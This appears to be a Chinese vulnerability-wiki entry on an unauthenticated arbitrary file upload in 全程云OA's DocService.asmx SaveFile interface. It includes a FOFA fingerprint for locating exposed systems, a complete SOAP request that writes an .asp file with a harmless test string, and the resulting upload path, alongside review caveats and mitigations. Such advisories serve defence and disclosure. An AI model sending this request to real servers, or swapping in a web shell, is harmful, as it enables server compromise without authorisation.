---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "全程云OA DocService.asmx SaveFile任意文件上传"
product: "全程云OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未给版本；ASP目录可写且可能执行"
prerequisites: "未说明；无凭证SOAP"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E5%85%A8%E7%A8%8B%E4%BA%91OA/%E5%85%A8%E7%A8%8B%E4%BA%91DocumentDocService.asmx%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"UserLoginFaster\""
fofa_unverified: "body="
id: "vw-ca0fd74a420b5f5d48aada2e"
entity_id: "ve-ca0fd74a420b5f5d48aada2e"
schema_version: "1"
---

# 全程云OA DocService.asmx SaveFile任意文件上传

## 条目说明

- 对象与具体问题：全程云OA；DocService.asmx SaveFile任意文件上传
- 版本、配置及部署条件：未给版本；ASP目录可写且可能执行
- 认证与权限前提：未说明；无凭证SOAP
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 已按原文中的具体接口、源码或上下文直接更正产品、根因或修复说明；未知版本和未经证明的影响仍明确保留为待核实。
- 标题DocumentDocService为路径拼接伪接口，应命名/OA/Document/DocService.asmx
- Base64正文仅测试文本，上传asp不直接证明RCE
- HTTP/SOAP缺围栏；在野利用无依据

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

全程云 OA 的 /OA/Document/DocService.asmx SaveFile 方法接收文件名与 Base64 内容。所示 Y2VzaGk= 仅编码测试文本 ceshi；即使成功写入 .asp 文件，也不能单独证明 ASP 代码执行。

## 影响版本

全程云

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="UserLoginFaster"

POC/EXP：

```http
POST /OA/Document/DocService.asmx HTTP/1.1
Host: 127.0.0.1
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/SaveFile"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <SaveFile xmlns="http://tempuri.org/">
      <bytes>Y2VzaGk=</bytes>
      <filename>jp.asp</filename>
    </SaveFile>
  </soap:Body>
</soap:Envelope>
```

> 请求长度说明：原资料 Content-Length 为 395；静态长度已移除，应由客户端根据最终请求体的字节数生成。


![image-20241028200856632](./.resource/全程云DocumentDocService.asmx接口存在任意文件上传漏洞/media/image-20241028200856632.png)


http://127.0.0.1/oa/Upfiles/temp/jp.asp

![image-20241028200949710](./.resource/全程云DocumentDocService.asmx接口存在任意文件上传漏洞/media/image-20241028200949710.png)


## 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
